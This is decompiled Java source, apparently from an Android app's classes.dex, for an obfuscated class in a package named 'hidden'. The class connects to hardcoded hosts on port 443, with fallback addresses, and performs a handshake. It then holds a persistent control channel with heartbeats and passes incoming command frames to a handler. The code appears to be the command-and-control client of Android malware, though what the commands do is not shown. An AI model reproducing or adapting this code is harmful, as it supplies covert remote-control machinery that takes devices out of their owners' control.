package ddth2.hidden;

import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Objects;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: renamed from: ddth2.hidden.n, reason: case insensitive filesystem */
/* JADX INFO: loaded from: classes.dex */
public final class C0014n {
    public final C0018s a;
    public final ScheduledExecutorService b;
    public final H c;
    public volatile Socket f;
    public volatile boolean g;
    public Thread h;
    public final AtomicBoolean d = new AtomicBoolean(false);
    public final AtomicBoolean e = new AtomicBoolean(false);
    public int i = 5000;

    public C0014n(C0018s c0018s, ScheduledExecutorService scheduledExecutorService, H h) {
        this.a = c0018s;
        this.b = scheduledExecutorService;
        this.c = h;
    }

    public final void a() throws Throwable {
        Socket socketC;
        String str;
        C0019t c0019tA;
        try {
            socketC = c();
            try {
                if (this.g) {
                    str = "from-ip";
                } else {
                    this.a.getClass();
                    str = "20260625";
                }
                this.a.getClass();
                C0018s c0018s = this.a;
                String str2 = c0018s.d;
                r.a(this.b, socketC, x.a(c0018s, str), 5000);
                InputStream inputStream = socketC.getInputStream();
                byte[] bArr = new byte[6];
                r.a(inputStream, bArr, 0, 6);
                C0019t c0019tA2 = x.a(inputStream, bArr);
                int i = c0019tA2.a;
                byte[] bArr2 = c0019tA2.b;
                if (i == 2) {
                    ArrayList arrayListA = C.a(bArr2);
                    int size = arrayListA.size();
                    int i2 = 0;
                    while (i2 < size) {
                        Object obj = arrayListA.get(i2);
                        i2++;
                        y yVar = (y) obj;
                        if (yVar.a == 16) {
                            char c = '\b';
                            int iMin = Math.min(yVar.b.length, 8);
                            long j = 0;
                            int i3 = 0;
                            while (i3 < iMin) {
                                j = (j << c) | (((long) yVar.b[i3]) & 255);
                                i3++;
                                c = '\b';
                            }
                            if (j == 0) {
                                break;
                            }
                            this.e.set(true);
                            this.i = 5000;
                            socketC.setSoTimeout(30000);
                            while (true) {
                                int i4 = 0;
                                while (true) {
                                    if (!this.d.get()) {
                                        this.e.set(false);
                                        if (this.f == socketC) {
                                            this.f = null;
                                        }
                                        z.a(socketC);
                                        return;
                                    }
                                    InputStream inputStream2 = socketC.getInputStream();
                                    byte[] bArr3 = new byte[6];
                                    try {
                                        int i5 = inputStream2.read();
                                        if (i5 < 0) {
                                            throw new EOFException();
                                        }
                                        bArr3[0] = (byte) i5;
                                        try {
                                            r.a(inputStream2, bArr3, 1, 5);
                                            c0019tA = x.a(inputStream2, bArr3);
                                            if (c0019tA == null) {
                                                i4++;
                                                if (i4 >= 3) {
                                                    throw new IOException("control heartbeat missed");
                                                }
                                                if (this.d.get() && !socketC.isClosed()) {
                                                    String str3 = this.a.a;
                                                    ScheduledExecutorService scheduledExecutorService = this.b;
                                                    byte[] byteArray = new A().a(1, str3).a.toByteArray();
                                                    byte[] bArr4 = new byte[byteArray.length + 6];
                                                    byte[] bArr5 = x.a;
                                                    bArr4[0] = bArr5[0];
                                                    bArr4[1] = bArr5[1];
                                                    bArr4[2] = 1;
                                                    bArr4[3] = (byte) 3;
                                                    int length = byteArray.length;
                                                    bArr4[4] = (byte) ((length >>> 8) & 255);
                                                    bArr4[5] = (byte) (length & 255);
                                                    System.arraycopy(byteArray, 0, bArr4, 6, byteArray.length);
                                                    r.a(scheduledExecutorService, socketC, bArr4, 5000);
                                                }
                                            }
                                        } catch (SocketTimeoutException e) {
                                            throw new IOException("CN frame timed out", e);
                                        }
                                    } catch (SocketTimeoutException unused) {
                                        c0019tA = null;
                                    }
                                }
                                int i6 = c0019tA.a;
                                byte[] bArr6 = c0019tA.b;
                                if (i6 == 4) {
                                    C0021v c0021vA = x.a(bArr6);
                                    c0021vA.b.size();
                                    Objects.toString(c0021vA.b);
                                    if (c0021vA.a) {
                                        this.c.a(c0021vA.b);
                                    }
                                } else if (i6 == 127) {
                                    throw new IOException("CN ERROR");
                                }
                            }
                        }
                    }
                }
                throw new IOException("HELLO_ACK failed");
            } catch (Throwable th) {
                th = th;
                this.e.set(false);
                if (this.f == socketC) {
                    this.f = null;
                }
                z.a(socketC);
                throw th;
            }
        } catch (Throwable th2) {
            th = th2;
            socketC = null;
        }
    }

    public final Socket b() throws IOException {
        String[] strArr = AbstractC0015o.b;
        int iNanoTime = ((int) (System.nanoTime() & 2147483647L)) % 2;
        IOException e = null;
        for (int i = 0; i < 2; i++) {
            if (!this.d.get()) {
                throw new IOException("control stopped");
            }
            String str = strArr[(iNanoTime + i) % 2];
            Socket socket = new Socket();
            InetSocketAddress inetSocketAddress = new InetSocketAddress(str, 443);
            try {
                this.f = socket;
                socket.setTcpNoDelay(true);
                socket.setKeepAlive(true);
                socket.setSoTimeout(5000);
                socket.connect(inetSocketAddress, 5000);
                socket.getLocalAddress().getHostAddress();
                socket.getLocalPort();
                socket.getInetAddress().getHostAddress();
                socket.getPort();
                this.g = true;
                return socket;
            } catch (IOException e2) {
                e = e2;
                if (this.f == socket) {
                    this.f = null;
                }
                z.a(socket);
            }
        }
        throw new IOException("CN fallback connect failed addresses=".concat(a(strArr)), e);
    }

    public final Socket c() throws IOException {
        String[] strArr = AbstractC0015o.a;
        boolean z = true;
        IOException e = null;
        for (int i = 0; i < 3; i++) {
            String str = strArr[i];
            if (!this.d.get()) {
                throw new IOException("control stopped");
            }
            try {
                return a(str);
            } catch (UnknownHostException e2) {
                e = e2;
            } catch (IOException e3) {
                e = e3;
                z = false;
            }
        }
        if (z) {
            try {
                return b();
            } catch (IOException e4) {
                e = e4;
                a(AbstractC0015o.b);
            }
        }
        throw new IOException("CN connect failed for hosts=" + a(AbstractC0015o.a) + " port=443", e);
    }

    public final Socket a(String str) throws IOException {
        InetAddress[] allByName = InetAddress.getAllByName(str);
        if (allByName.length != 0) {
            int length = allByName.length;
            InetAddress[] inetAddressArr = new InetAddress[length];
            int i = 0;
            for (InetAddress inetAddress : allByName) {
                if (inetAddress instanceof Inet4Address) {
                    inetAddressArr[i] = inetAddress;
                    i++;
                }
            }
            for (InetAddress inetAddress2 : allByName) {
                if (!(inetAddress2 instanceof Inet4Address)) {
                    inetAddressArr[i] = inetAddress2;
                    i++;
                }
            }
            for (int i2 = 0; i2 < length; i2++) {
                inetAddressArr[i2].getHostAddress();
            }
            IOException iOException = null;
            int i3 = 0;
            while (i3 < length) {
                if (this.d.get()) {
                    Socket socket = new Socket();
                    InetSocketAddress inetSocketAddress = new InetSocketAddress(inetAddressArr[i3], 443);
                    try {
                        this.f = socket;
                        socket.setTcpNoDelay(true);
                        socket.setKeepAlive(true);
                        socket.setSoTimeout(5000);
                        inetSocketAddress.getAddress().getHostAddress();
                        inetSocketAddress.getPort();
                        socket.connect(inetSocketAddress, 5000);
                        socket.getLocalAddress().getHostAddress();
                        socket.getLocalPort();
                        socket.getInetAddress().getHostAddress();
                        socket.getPort();
                        this.g = false;
                        return socket;
                    } catch (IOException e) {
                        inetSocketAddress.getAddress().getHostAddress();
                        inetSocketAddress.getPort();
                        if (this.f == socket) {
                            this.f = null;
                        }
                        z.a(socket);
                        i3++;
                        iOException = e;
                    }
                } else {
                    throw new IOException("control stopped");
                }
            }
            StringBuilder sb = new StringBuilder("CN connect failed for ");
            sb.append(str);
            sb.append(":443 addresses=");
            StringBuilder sb2 = new StringBuilder();
            for (int i4 = 0; i4 < length; i4++) {
                if (i4 > 0) {
                    sb2.append(',');
                }
                sb2.append(inetAddressArr[i4].getHostAddress());
            }
            sb.append(sb2.toString());
            throw new IOException(sb.toString(), iOException);
        }
        throw new IOException("CN DNS returned no address for " + str);
    }

    public static String a(String[] strArr) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < strArr.length; i++) {
            if (i > 0) {
                sb.append(',');
            }
            sb.append(strArr[i]);
        }
        return sb.toString();
    }
}
